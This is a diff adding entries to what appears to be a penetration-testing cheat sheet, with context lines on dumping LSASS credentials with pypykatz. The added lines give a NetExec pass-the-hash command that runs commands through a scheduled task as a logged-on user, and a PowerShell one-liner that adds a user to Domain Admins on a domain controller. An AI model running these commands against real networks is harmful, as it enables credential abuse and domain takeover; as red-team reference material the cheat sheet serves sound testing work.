@@ -594,6 +594,10 @@ pypykatz lsa minidump lsass.DMP
   ```shell
   NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -X <command>
   ```
+  #### Task Scheduler
+  ```shell
+  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
+  ```
 </details> 
 
 <details>
@@ -615,6 +619,11 @@ pypykatz lsa minidump lsass.DMP
   #### Add the new user to the Domain Admins group
   ```Shell
   net group "Domain Admins" <username> /add /domain
+  ```
+
+  #### Add an user to the domain admin
+  ```ps
+  powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
   ```
 </details> 
 
